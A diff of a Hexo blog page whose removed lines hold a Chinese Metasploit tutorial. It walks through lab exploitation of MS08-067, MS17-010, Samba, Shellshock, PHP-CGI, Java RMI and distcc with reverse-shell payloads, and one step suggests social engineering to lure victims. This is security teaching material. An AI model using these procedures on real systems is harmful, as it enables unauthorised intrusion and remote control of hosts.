@@ -1,659 +1,1319 @@
 <!DOCTYPE html>
 <html>
-<head>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/4.0.0-rc.4'>
   <meta charset="utf-8">
+  <!-- SEO相关 -->
   
+    
+      
+        <meta name="robots" content="index,follow">
+      
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
 
+  <!-- 页面元数据 -->
   
   <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
   
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css">
+
   
   
-    <link rel="icon" href="/favicon.png">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
   
   
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  
+    
 <link rel="stylesheet" href="/css/style.css">
 
-<meta name="generator" content="Hexo 5.1.1"></head>
+  
+  
+  
+  <!-- 脚本懒加载函数 -->
+  <script>
+  function loadScript(src, cb) {
+    var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+    var script = document.createElement('script');
+    script.setAttribute('type','text/javascript');
+    if (cb) script.onload = cb;
+    script.setAttribute('src', src);
+    HEAD.appendChild(script);
+  }
+  //https://github.com/filamentgroup/loadCSS
+  !function(c){"use strict";var e=function(e,t,n,r){var o,i=c.document,a=i.createElement("link");if(t)o=t;else{var d=(i.body||i.getElementsByTagName("head")[0]).childNodes;o=d[d.length-1]}var f=i.styleSheets;if(r)for(var l in r)r.hasOwnProperty(l)&&a.setAttribute(l,r[l]);a.rel="stylesheet",a.href=e,a.media="only x",function e(t){if(i.body)return t();setTimeout(function(){e(t)})}(function(){o.parentNode.insertBefore(a,t?o:o.nextSibling)});var s=function(e){for(var t=a.href,n=f.length;n--;)if(f[n].href===t)return e();setTimeout(function(){s(e)})};function u(){a.addEventListener&&a.removeEventListener("load",u),a.media=n||"all"}return a.addEventListener&&a.addEventListener("load",u),(a.onloadcssdefined=s)(u),a};"undefined"!=typeof exports?exports.loadCSS=e:c.loadCSS=e}("undefined"!=typeof global?global:this);
+  </script>
+  <script id="loadcss"></script>
+</head>
 
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
+  <header class="l_header auto shadow blur " style='opacity: 0' >
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
         
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-MSF" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/04/MSF/" class="article-date">
-  <time datetime="2020-07-04T12:39:11.571Z" itemprop="datePublished">2020-07-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="一-初识-MSF"><a href="#一-初识-MSF" class="headerlink" title="一.初识    MSF"></a>一.初识    MSF</h1><h2 id="1-1什么是Metasploit"><a href="#1-1什么是Metasploit" class="headerlink" title="1.1什么是Metasploit"></a>1.1什么是Metasploit</h2><p>Metasploit就是个漏洞框架。 它的全称叫做The Metasploit Framework ,简称MSF。是一个免费、可下载的框架,通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布MSF时,计算机安全状况也被永久性地改变了。仿佛一夜之间， 任何人都可以成为黑客,每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补J的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为MSF团队一直都在努力开发各种攻击工具,并将它们贡献给所有MSF用户。<br>MSF的设计初衷是打造成一个攻击工具开发平台 ,然而在目前情况下,安全专家以及业余安全爱好者更多地将其当作种点几下 鼠标就可以利用其中附带的攻击工具进行成功攻击的环境。</p>
-<h2 id="1-2MSF专业术语讲解"><a href="#1-2MSF专业术语讲解" class="headerlink" title="1.2MSF专业术语讲解"></a>1.2MSF专业术语讲解</h2><h3 id="1-2-1渗透攻击-Exploit"><a href="#1-2-1渗透攻击-Exploit" class="headerlink" title="1.2.1渗透攻击(Exploit)"></a>1.2.1渗透攻击(Exploit)</h3><p>渗透攻击是指由攻击者或者渗透测试者利用系统、应用或服务中的安全漏洞，所进行的攻击行为。<br>流行的攻击技术包括:缓冲区溢出、Web应用程序漏洞攻击,以及利用配置错误等。</p>
-<h3 id="1-2-2攻击载荷-Payload"><a href="#1-2-2攻击载荷-Payload" class="headerlink" title="1.2.2攻击载荷(Payload)"></a>1.2.2攻击载荷(Payload)</h3><p>攻击载何是我们期望目标系统在被渗透攻击后而执行的代码，在框架中可以自由的选择、传送和植入。比如，反弹式shell 是一种从目标主机到攻击主机创建网络连接,并提供命令行shell 的攻击载荷。bind shell 攻击载荷则在目标主机上将命令行shell 绑定到一个打开的监听端口,攻击者可以连接这些端口来取得shell交互。</p>
-<h3 id="1-2-3溢出代码-Shellcode"><a href="#1-2-3溢出代码-Shellcode" class="headerlink" title="1.2.3溢出代码(Shellcode)"></a>1.2.3溢出代码(Shellcode)</h3><p>shellcode是在渗透攻击时作为攻击载荷运行的一组机器指令。shellcode通常用汇编语言编写。在大多数情况下,目标系统执行了shellcode这一组指令后 才会提供一个命令行shell或者Meterpreter shell ,这也是shellcode名称的由来。</p>
-<h3 id="1-2-4模块-Module"><a href="#1-2-4模块-Module" class="headerlink" title="1.2.4模块( Module)"></a>1.2.4模块( Module)</h3><p>在MSF中，一个模块是指MSF框架中所使用的一段软件代码组件。在某些时候,你可能会使用一个渗透攻击模块( Exploit module ).也就是用于实际发起渗透攻击的软件组件。而在其它时候，则可能使用个辅助模块( auxiliary module ).用来扫描一些诸如扫描或系统查点的攻击动作。</p>
-<h3 id="1-2-5监听器-Listener"><a href="#1-2-5监听器-Listener" class="headerlink" title="1.2.5监听器(Listener)"></a>1.2.5监听器(Listener)</h3><p>监听器是MSF中用来等待连入网络连接的组件。举例来说,在目标主机被渗透攻击之后，它可能会通过互联网回连到攻击主机上，而监听器组件在攻击主机上等待被渗透攻击的系统来连接，并负责处理这些网络连接。</p>
-<h1 id="二-更新MSF以及目录结构"><a href="#二-更新MSF以及目录结构" class="headerlink" title="二.更新MSF以及目录结构"></a>二.更新MSF以及目录结构</h1><h2 id="2-1-如何更新MSF"><a href="#2-1-如何更新MSF" class="headerlink" title="2.1.如何更新MSF"></a>2.1.如何更新MSF</h2><p>首先，替换源，可以换成阿里源，将原本的源用#注释掉，因为国内访问它的源太慢。</p>
-<p>然后，添加数字签名。</p>
-<p>有时候会出现故障，就得把老的MSF卸载：apt remove metasploit-framework</p>
-<p>更新命令：apt-get update（这些都是在msf中执行的命令）</p>
-<p>安装MSF框架：apt-get install metasploit-framework</p>
-<p>进入msf：msfconsole</p>
-<p>若提示没有相应的数据库支持：quit (退出msf)</p>
-<p>启动数据库：systemctl start postgresql</p>
-<p>允许开机自启：systemctl enable postgresql</p>
-<p>构建数据库缓存：msfdb init</p>
-<h2 id="2-2-MSF的目录结构"><a href="#2-2-MSF的目录结构" class="headerlink" title="2.2.MSF的目录结构"></a>2.2.MSF的目录结构</h2><p>MSF 在BT5下存放目录：/opt/MSF</p>
-<p>MSF 在kali 下存放目录：/usr/share/metasploit-framework/</p>
-<h2 id="2-3-Modules-模块"><a href="#2-3-Modules-模块" class="headerlink" title="2.3.Modules(模块)"></a>2.3.Modules(模块)</h2><p>存放路径：/usr/share/metasploit-framework/modules/(个人写的模块也可以存放在这里)</p>
-<h3 id="2-3-1-Auxiliary"><a href="#2-3-1-Auxiliary" class="headerlink" title="2.3.1.Auxiliary"></a>2.3.1.Auxiliary</h3><p>主要包含渗透测试中一些辅助性的脚本，这些即本功能有扫描，嗅探，破解，注入，漏洞挖掘等。</p>
-<h3 id="2-3-2-Encoders"><a href="#2-3-2-Encoders" class="headerlink" title="2.3.2.Encoders"></a>2.3.2.Encoders</h3><p>各种编码工具用于躲过入侵检测和过滤系统。</p>
-<h3 id="2-3-3-Exploits"><a href="#2-3-3-Exploits" class="headerlink" title="2.3.3.Exploits"></a>2.3.3.Exploits</h3><p>主要包含了传说中的exp、0day. 各种漏洞利用的脚本。主要的攻击代码全在这，这里边包含的exp的路径的命名规则是系统/服务/模块，在使用exp是可以根据这个命名方法来找(也可以用search这条指令来找)比如:use exploits/windows(系统)/vnc(服务)/realvnc_client(模块名)</p>
-<h3 id="2-3-4-Nops"><a href="#2-3-4-Nops" class="headerlink" title="2.3.4.Nops"></a>2.3.4.Nops</h3><p>NOP (No Operation or Next Operation) sled,由于IDS/IPS会检查数据包中不规则的数据，所以在某些场合下(比如针对溢出攻击),某些特殊的滑行字符串(NOPS x90x9…)则会因为被拦截而导致攻击失效，所以此时需要修改exploit中的NOPs.nops文件夹下的东西会在payload生成时用到(后面会有介绍)。比如我们打开php的NOPS生成脚本,就会发现它只是返回了指定长度的空格而已。(不理解没关系)。</p>
-<h3 id="2-3-5-Payloads"><a href="#2-3-5-Payloads" class="headerlink" title="2.3.5.Payloads"></a>2.3.5.Payloads</h3><p>这个单词翻译过来叫载荷:是攻击者发送给系统执行的指令(不包含exploits 攻击阶段) , payloads主要是在目标机执行的,而exploits是在本地机执行作用于目标机。命名规则是:系统/类型/名称比如: use payloads/windows/shell/bind_tcp.</p>
-<h3 id="2-3-6-Post"><a href="#2-3-6-Post" class="headerlink" title="2.3.6.Post"></a>2.3.6.Post</h3><p>这个目录里放着msf的exploits执行成功后,向目标机发送的一些功能性指令,比如:提权,获取hash等。</p>
-<h3 id="2-3-7-Data"><a href="#2-3-7-Data" class="headerlink" title="2.3.7.Data"></a>2.3.7.Data</h3><p>这个目录里盛放了Meterpreter、PassiveX、 Vnc、 DLLS 等这些工具和一些用户接口代码, Msfweb和一些其他模块用到的数据文件。</p>
-<p>Data下js文件夹下的Detect ,这里面存放的是MSF的探针文件。如果看过MSF浏览器攻击脚本的代码,就会发现调用了一个js库，然后检查当前请求是否符合被攻击环境。如果符合则发送攻击代码,否则中断。Memory中主要是一些堆喷射代码。 在大部分浏览器漏洞利用过程,堆喷射是一个不可或缺的过程(当然不是绝对的! )。并且不同的浏览器及版本间,堆喷射代码都有所不同。</p>
-<h3 id="2-3-8-Plugins"><a href="#2-3-8-Plugins" class="headerlink" title="2.3.8.Plugins"></a>2.3.8.Plugins</h3><p>这里的模块用户需要使用load来加载提供数据库连接插件和各种要用到的插件。</p>
-<h3 id="2-3-9-Scripts"><a href="#2-3-9-Scripts" class="headerlink" title="2.3.9.Scripts"></a>2.3.9.Scripts</h3><p>这个目录下的文件大都是Meterpreter这个模块利用的脚本，比如Meterpreter里用到的migrate来转移到其他进程的指令的源代码就在这个目录下。</p>
-<p>这里的rc脚本相当于Windows下的批处理脚本, 在某些情况下会有一定便捷性。比如Veil 在生成免杀payload的同时也会生成一个rc脚本，此时使用msfconsole -r xx.rc便可以快速的建立一个和payload对应的handler ,亦或在攻击过程中需要你反复的set exploit,那么就可以使用这个批处理脚本了,而这个目录下则是一些给定的rc脚本,虽然你可能不习惯这样使用,但作为改写自己的rc脚本的资源也不错。</p>
-<h3 id="2-3-10-TOOLS"><a href="#2-3-10-TOOLS" class="headerlink" title="2.3.10.TOOLS"></a>2.3.10.TOOLS</h3><p>包含一些有用的脚本和零散的工具。</p>
-<h1 id="三-MSF基本命令"><a href="#三-MSF基本命令" class="headerlink" title="三.MSF基本命令"></a>三.MSF基本命令</h1><h2 id="3-1-Msfconsole控制台"><a href="#3-1-Msfconsole控制台" class="headerlink" title="3.1.Msfconsole控制台"></a>3.1.Msfconsole控制台</h2><p>它是一个一体化集中控制台，允许你访问到几乎所有的MSF框架选项。MSF起初看似吓人的,但一旦你学习他的语法命令,你将会欣赏利用该接的力量。</p>
-<h2 id="3-2-Msfconsole的好处"><a href="#3-2-Msfconsole的好处" class="headerlink" title="3.2.Msfconsole的好处"></a>3.2.Msfconsole的好处</h2><p>这是唯一能访问大多数支持在MSF特点。</p>
-<p>Console- based界面提供了一个框架。</p>
-<p>具有最稳定的MSF界面。</p>
-<p>充分支持Readline，Tabbing以及其他各类命令。</p>
-<p>支持Msfconsole外部命令执行。</p>
-<h2 id="3-3-Msfconsole命令"><a href="#3-3-Msfconsole命令" class="headerlink" title="3.3.Msfconsole命令"></a>3.3.Msfconsole命令</h2><p>？：命令帮助，可以使用的命令</p>
-<p>在？后面加命令(和前面的？有空格)：可以解释该命令的含义</p>
-<p>search：搜索模块名和描述</p>
-<p>use：+模块路径和模块本身  -&gt;使用该模块</p>
-<p>进入模块：info -&gt; 查阅该模块信息      / check  -&gt;   检测</p>
-<p>back：从当前环境（模块环境）返回 ，返回到上一级目录（类似于 .. )</p>
-<p>banner：显示MSF的banner的信息</p>
-<p>color：颜色转换</p>
-<p>connect：+IP地址或者域名+端口号   -&gt; 连接主机</p>
-<p>exit/quit：退出MSF</p>
-<p>irb：进入irb脚本模式</p>
-<p>jobs：显示和管理作业（和windows下的任务管理器的进程作用一样）</p>
-<p>kill：+进程名字 -&gt; 杀死一个作业（和结束进程作用一样）</p>
-<p>loadpath：加载一个模块的路径</p>
-<p>load：加载一个插件</p>
-<p>upload：卸载一个模块</p>
-<p>resource：运行储存一个文件中的命令</p>
-<p>route：查看一个会话的路由信息</p>
-<p>save：保存动作</p>
-<p>set：给一个变量赋值   （如：set RHOST 192.168.133.133)</p>
-<p>unset：解除一个或多个变量</p>
-<p>setg：把一个赋值给全局变量，例如上述的set 设置的IP，就会用到其他攻击模块的RHOST中。</p>
-<p>unsetg：解除一个或多个全局变量</p>
-<p>sleep：在限定秒数内什么也不做</p>
-<p>show：显示所有类型的模块</p>
-<p>version：显示MSF和控制台库的版本</p>
-<h1 id="四-Exploits-And-Payloads-模块"><a href="#四-Exploits-And-Payloads-模块" class="headerlink" title="四.Exploits And Payloads 模块"></a>四.Exploits And Payloads 模块</h1><p>show + 模块名(s) -&gt; 查看该模块下可以使用的</p>
-<h2 id="4-1-Exploits-模块"><a href="#4-1-Exploits-模块" class="headerlink" title="4.1.Exploits 模块"></a>4.1.Exploits 模块</h2><p>命名规则:系统/服务/名称<br>例如: windows/smb/ms08_067_netapi </p>
-<p>RHOST :目标主机IP地址</p>
-<p>RPORT :目标主机连接端口。</p>
-<p>Payload :有效的载荷,成功后返回shell.</p>
-<p>LHOST :攻击者的IP地址（我们自己就是攻击者）</p>
-<p>LPORT :攻击者的端口</p>
-<p>SRVHOST：攻击者自己搭建的服务器的IP地址</p>
-<p>SRVPORT：攻击者自己搭建的服务器的端口号</p>
-<p>SSL：证书</p>
-<p>URIPATH：路径</p>
-<h2 id="4-2-Payloads-模块"><a href="#4-2-Payloads-模块" class="headerlink" title="4.2.Payloads 模块"></a>4.2.Payloads 模块</h2><p>是在使用一个模块之后再去使用的。</p>
-<p>命名规则:系统/类型/名称<br>例如: Windows/dllinject/reverse tcp.</p>
-<p>类型命名规则<br>shell：上传一个shell,。<br>dllinject：注入一个dll到进程。<br>patchup*** ：修补漏洞。。<br>upexec：上传并执行一个文件。<br>meterpreter ：高级的payload。<br>vncinject ：高级的payload。<br>passive ：高级的payload。</p>
-<p>名称的命名规则<br>shell find tag在一个已建立的连接上创建一个shell,<br>shell reverse_tcp:反向连接到攻击者主机并创建一个shell<br>bind_tcp:监听一个tcp连接。<br>reverse_tcp:反向建立tcp连接。<br>reverse_http通过HTTP隧道通信并创建一个新用户添加到管理组。<br>add_user创建一个新用户并添加到管理组。<br>xxx_ipv6_tcp:基于IPV6<br>xxx_nonx_tcp:no execute或win7 ( NX是应用在CPU的一种可以防止缓冲区溢出的技术)<br>xxx_ord_tcp:有序payload。<br>xxx_tcp_allports:在所有可能的端口。</p>
-<h1 id="五-MSF漏洞实例测试"><a href="#五-MSF漏洞实例测试" class="headerlink" title="五.MSF漏洞实例测试"></a>五.MSF漏洞实例测试</h1><p>三种攻击实例</p>
-<h2 id="5-1-网络服务器攻击渗透（MS08-067"><a href="#5-1-网络服务器攻击渗透（MS08-067" class="headerlink" title="5.1.网络服务器攻击渗透（MS08_067)"></a>5.1.网络服务器攻击渗透（MS08_067)</h2><p>用到的靶机：WinXPenSP3</p>
-<p>首先，执行msfconsole命令：msfconsole</p>
-<p>接着，搜索ms08_067目录：search ms08_067</p>
-<p>然后，</p>
-<h2 id="5-2-浏览器攻击渗透（MS10-018"><a href="#5-2-浏览器攻击渗透（MS10-018" class="headerlink" title="5.2.浏览器攻击渗透（MS10_018)"></a>5.2.浏览器攻击渗透（MS10_018)</h2><p>用到的靶机：WinXPenSP3</p>
-<p>首先，执行msfconsole命令：msfconsole</p>
-<p>接着，搜索ms10_018目录,搜索模块路径：search ms10_018</p>
-<p>然后，进入搜索到的模块：use + 模块路径</p>
-<p>查看该模块使用以及会影响win的详细信息：show options</p>
-<p>设置自己服务器IP：set SRVHOST + IP地址(这里就填kali的IP，一般来说填公网IP地址)</p>
-<p>设置一下端口，为了方便识别：例如：set LPORT 4441</p>
-<p>设置一个payload正向连接shell：例如：set PAYLOAD windows/meterpreter/bind_tcp</p>
-<p>再看我们payload的选项配置：show options 一下（就是可以看到我们上面是否把配置的参数放进去了）</p>
-<p>run 一下，会有一个 url 地址，这个地址就是要通过社工等方法让目标机进行访问（抛出一个诱导，让肉机访问）（当肉机点击访问后，我们就有可能得到肉机的系统权限）</p>
-<p>查看我们得到的肉机信息：sessions -i</p>
-<p>进入肉机系统：sessions -i +肉机编号（看有多少台机器上钩）</p>
-<h2 id="5-3-应用软件格式渗透，利用word去渗透（MS10-087"><a href="#5-3-应用软件格式渗透，利用word去渗透（MS10-087" class="headerlink" title="5.3.应用软件格式渗透，利用word去渗透（MS10_087)"></a>5.3.应用软件格式渗透，利用word去渗透（MS10_087)</h2><p>用到的靶机：WinXPenSP3</p>
-<p>首先，执行msfconsole命令：msfconsole</p>
-<p>接着，搜索ms10_087目录,搜索模块路径：search ms10_087</p>
-<p>然后，使用这个模块：use + 模块及它的路径</p>
-<p>查看该模块使用以及会影响win的详细信息：show options（看看要设置哪些信息）</p>
-<p>设置需要设置的信息，显然这个模块要设置文件名（如果不设置就是保持它原本的默认名）</p>
-<p>设置一个payload，前面我们都是设置的交互式的，这里我们换一个payload：例如：set payload windows/exec</p>
-<p>再看我们payload的选项配置：show options 一下（就是可以看到我们上面是否把配置的参数放进去了）,这里也会提示我们还要设置什么payload选项</p>
-<p>这里出现还要我们设置CMD：这是处于win类似元终端执行的命令，比如我们执行弹出一个计算器：set CMD calc.exe</p>
-<p>run一下，我们就会得到word文档，就是我们之前自己设计的文件名，它会告诉我们生成文件的位置</p>
-<p>然后我们可以把它拷贝到home里：home:mv +文件路径/home/，然后再托到本机，就可以看出效果了</p>
-<h2 id="5-4-网路服务器攻击渗透测试（MS17-010"><a href="#5-4-网路服务器攻击渗透测试（MS17-010" class="headerlink" title="5.4.网路服务器攻击渗透测试（MS17_010)"></a>5.4.网路服务器攻击渗透测试（MS17_010)</h2><p>用到的靶机：Win7</p>
-<p>首先，执行msfconsole命令：msfconsole</p>
-<p>接着，搜索ms17_010目录,搜索模块路径：search ms17_010（这个就是之前的永恒之蓝）</p>
-<p>然后，使用这个模块：use + 模块及它的路径</p>
-<p>查看该模块使用以及会影响win的详细信息：show options（看看要设置哪些信息）</p>
-<p>设置需要设置的信息：set RHOST，LHOST(这个不是必须设置的，要求上没有它，但是还是设置一下)</p>
-<p>设置一个payload，设置一个64位的：set payload windows/x64/meterpreter/reverse_tcp（反向连接，只要被攻击机存在漏洞时，就会反向连接到攻击机上）</p>
-<p>再看我们payload的选项配置：show options 一下（就是可以看到我们上面是否把配置的参数放进去了）,这里也会提示我们还要设置什么payload选项。</p>
-<p>run一下，当我们进入了meterpreter模式，就说明我们拿到了shell，shell 一下，我们就直接进入到别人的系统</p>
-<h2 id="5-5-利用-samba-服务漏洞入侵-Linux-主机（CVE-2017-7494-与-samba-低版本漏洞利用）"><a href="#5-5-利用-samba-服务漏洞入侵-Linux-主机（CVE-2017-7494-与-samba-低版本漏洞利用）" class="headerlink" title="5.5.利用 samba 服务漏洞入侵 Linux 主机（CVE-2017-7494 与 samba 低版本漏洞利用）"></a>5.5.利用 samba 服务漏洞入侵 Linux 主机（CVE-2017-7494 与 samba 低版本漏洞利用）</h2><p>Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件 ，由服务器及客户端程序构成samba服务对应的端口有139，445等等。本文将简单介绍metasploit利用samba漏洞入侵进入远程linux主机。</p>
-<ol>
-<li><p>首先要扫描目标主机上开放的端口和服务,用nmap,命令如下:<br>nmap -sS -Pn -A 192.168.133.133</p>
-</li>
-<li><p>发现主机上开放的139 , 445端口之后,说明该主机有可能存在samba服务远程溢出漏河，尝试通过该端口建立一个meterpreter会话，需要用到metasploit。</p>
-</li>
-<li><p>打开metasploit之后需要先判断samba的版本，命令如下:</p>
-<p>msf&gt; search auxiliary/scanner/samba </p>
-<p>这条命令用来查找samba相关exploit 参数</p>
-</li>
-<li><p>然后使用如下命令来定义要扫描samba的版本所用到的exploits参数</p>
-<p>msf&gt; use auxiliary/scanner/smb/smb_version</p>
-<p>msfauxiliary(smb_version) &gt; set RHOSTS 192.168.133.xxx（这两步是扫描这个肉鸡是否能被攻击）</p>
-<p>这条命令定义你将要扫描samba版本的远程主机的IP地址。</p>
-<p>exploit  ：开始漏洞利用</p>
-</li>
-<li><p>发现samba版本之后,我们需要进一步利用来入侵进入到远程linux主机</p>
-<p>msf&gt; use exploit/multi/samba/usermap_script<br>msf exploit(usermap_script) &gt; set RHOST 192.168.133.xxx</p>
-<p>msf exploit(usermap script) &gt; exploit</p>
-<p>执行完成以上命令如图所示,成功创建了shell 会话。</p>
-</li>
-</ol>
-<p>（二）smb 其他漏洞 Linux smb 漏洞（CVE-2017-7494）复现</p>
-<p>漏洞编号： CVE-2017- 7494.<br>漏洞等级：严重<br>影响版本：漏洞影响了Samba 3.5.0之后的版本，不包含4.6.4/4.5.10/4.4.14</p>
-<ol>
-<li><p>查看samba版本</p>
-<p>samba -V     #查看samba版本</p>
-</li>
-<li><p>打开samba配置文件添加以下配置，配置共享：</p>
-<p>vi /etc/samba/smb.conf</p>
-<p>在末行加入：</p>
-<p>[public]</p>
-<pre><code>comment = public
-browseable = yes
-writeable =yes
-path = /tmp/public
-public = yes
-read only = no</code></pre>
-<p>:wq  #保存退出</p>
-</li>
-<li><p>Kali Linux 2017里面创建Samnba共享目录，创建共享目录</p>
-<p>创建共享目录：mkdir /tmp/public</p>
-<p>修改执行读写权限：chmod 777 /tmp/public/</p>
-<p>这是 SambaCry 漏洞利用的前提，必须有一个共享目录，这样攻击者就可以在共享目录下传递攻击代码并执行，获得root 权限并控制肉鸡。</p>
-</li>
-<li><p>Kali Linux 2017 重启/ 启动 Samba 服务</p>
-<p>重启 Samba 服务：/etc/init.d/samba restart</p>
-<p>查看 Samba 进程：ps aux | grep samba</p>
-<p>查看Samba 端口状态：netstat -tnlp samba（采用445和139端口）</p>
-</li>
-<li><p>更新MSF 后使用”exploit/linux/samba/is_known_pipename”利用模块，设置 rhost 后直接 exploit 即可得到 shell</p>
-</li>
-</ol>
-<p>注意：有的 poc 会存在32位和64位之分，1-4的步骤是在肉鸡上的操作（被攻击的Linux机）</p>
-<h2 id="5-6-Bash-Shellshock-CVE-2014-6271（破壳）"><a href="#5-6-Bash-Shellshock-CVE-2014-6271（破壳）" class="headerlink" title="5.6.Bash Shellshock CVE_2014_6271（破壳）"></a>5.6.Bash Shellshock CVE_2014_6271（破壳）</h2><p>Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞。启动Bash的时候不但会导入这个函数，而且也会把函数定义后面的命令执行。在有些CGI脚本的设计中,数据是通过环境变量来传递的,这样就给了数据提供者利用Shellshock漏洞的机会。</p>
-<p>简单来说就是由于服务器的cgi脚本调用了bash命令,由于bash版本过低,攻击者把有害数据写入环境变量,传到服务器端,触发服务器运行Bash脚本,完成攻击。</p>
-<p><strong>本次实战环境：</strong></p>
-<p>metasploitable2 是一个非常不错的靶机 ,内置了多种漏洞来练习你的黑客技术。我将在独立网络环境中使用kali来攻击它,建议你也跟我一样, 确保在第一次尝试攻击时结果和我一样，等技术娴熟后就可以渗透真实的机器了。</p>
-<ol>
-<li><p>第一步：配置靶机</p>
-<p>要利用此漏洞，要在 cgi-bin 目录下有一个可执行脚本，一个简单的输出 ”hello world ”脚本即可，因为仅仅是作为演示，进入靶机的 /usr/lib/cgi-bin/ 目录下，输入以下命令：</p>
-<p>命令：sudo nano hello.sh</p>
-<p>输入正确的密码后，对hello.sh 进行编辑：</p>
-<p>#! /bin/bash</p>
-<p>echo “Content-type:text/html”</p>
-<p>echo “”</p>
-<p>echo “Hello World !”</p>
-<p>保存好后，赋予脚本可执行权限，用 chmod 命令：sudo chmod 775 hello.sh</p>
-<p>我们来验证以下，通过浏览器访问该脚本，可以看到已经成功执行:192.168.133.139/cgi-bin/hello.sh</p>
-</li>
-<li><p>第二步：准备攻击</p>
-<p>在kali中，进入 metasploit ：msfconsole</p>
-<p>我们可以通过 search 来搜索 exploits ，输入search shellshock ,这样就能搜索到 apache_mod_cgi_bash_env_exec 模块</p>
-<p>输入 ：show options 来查看该模块要配置的东西</p>
-<p>大部分是选择默认配置，这里只要配置远程 RHOSTS ，本地监听的IP  LHOST和文件路径 targeturi ：set targeturi /cgi-bin/hello.sh</p>
-<p>设置了本地IP LHOST，就得设置payload ，命令：set payload linux/x86/shell/reverse_tcp</p>
-</li>
-<li><p>第三步：getshell</p>
-<p>一些 metasploit 模块有一个非常便利的小功能，就是检测靶机是否有漏洞，输入 check 命令检测即可，这将会把靶机是否存漏洞检测出来。</p>
-<p>输入：exploit 命令进行攻击</p>
-</li>
-</ol>
-<h2 id="5-7-PHP-CGI-漏洞利用"><a href="#5-7-PHP-CGI-漏洞利用" class="headerlink" title="5.7.PHP CGI 漏洞利用"></a>5.7.PHP CGI 漏洞利用</h2><p>一般通过 phpinfo 来查看是否符合CGI漏洞利用，通常看 Server API ：CGI / *，CGI是服务器的扩展功能（比如：留言板提交，IIS/Windows 的php 要用到）</p>
-<p>靶机：metasploitable2</p>
-<p>命令：</p>
-<p>msf &gt; search cve:2012-1823</p>
-<p>msf &gt; use exploit/multi/http/php_cgi_arg_injection</p>
-<p>msf exploit(php_cgi_arg_injection) &gt;show options</p>
-<p>msf exploit(php_cgi_arg_injection) &gt; set RHOSTS 192……</p>
-<p>msf exploit(php_cgi_arg_injection) &gt; run(或者exploit)</p>
-<h2 id="5-8-Java-RMI-SERVER-命令执行漏洞与-java-cve-2013-0422"><a href="#5-8-Java-RMI-SERVER-命令执行漏洞与-java-cve-2013-0422" class="headerlink" title="5.8.Java RMI SERVER 命令执行漏洞与 java cve_2013_0422"></a>5.8.Java RMI SERVER 命令执行漏洞与 java cve_2013_0422</h2><p>Java RMI SERVER 的 RMI 注册表 和 RMI 激活服务的默认配置存在安全漏洞，导致代码执行</p>
-<p>利用步骤：</p>
-<p>nmap -p0-65535 IP，查看 1099 端口是否开启</p>
-<p>msf &gt; use exploit/muti/misc/java_rmi_server</p>
-<p>msf exploit(java_rmi_server) &gt; set RHOSTS IP</p>
-<p>msf exploit(java_rmi_server) &gt; exploit</p>
-<p>meterpreter &gt;shell</p>
-<p><strong>二. java cve:2013-0422</strong></p>
-<h2 id="5-9-Distcc-后门漏洞利用"><a href="#5-9-Distcc-后门漏洞利用" class="headerlink" title="5.9. Distcc 后门漏洞利用"></a>5.9. Distcc 后门漏洞利用</h2><p>安全组织索引：CVE-2004-2678，OSVDB-13378</p>
-<p>Distcc 用于大量代码在网络服务器上的分布式编译,但是如果配置不严格，容易被滥用执行命令，该漏洞是Xcode 1.5 版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制</p>
